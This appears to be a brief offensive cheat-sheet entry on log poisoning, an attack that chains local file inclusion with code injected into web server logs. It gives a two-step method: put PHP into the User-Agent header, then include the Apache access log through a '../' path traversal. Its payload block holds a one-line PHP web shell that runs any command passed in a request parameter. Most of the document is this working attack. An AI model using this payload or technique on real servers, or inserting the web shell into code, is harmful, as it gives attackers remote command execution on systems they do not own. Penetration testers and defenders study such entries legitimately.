# Log Poisoning

## Summary
Inject PHP code into server logs then LFI to execute.

## Technique
1. Inject PHP payload in User-Agent (access log)
2. Include the log file via LFI: `../../../var/log/apache2/access.log`

## Payloads

```
User-Agent: <?php system($_GET['c']); ?>
```
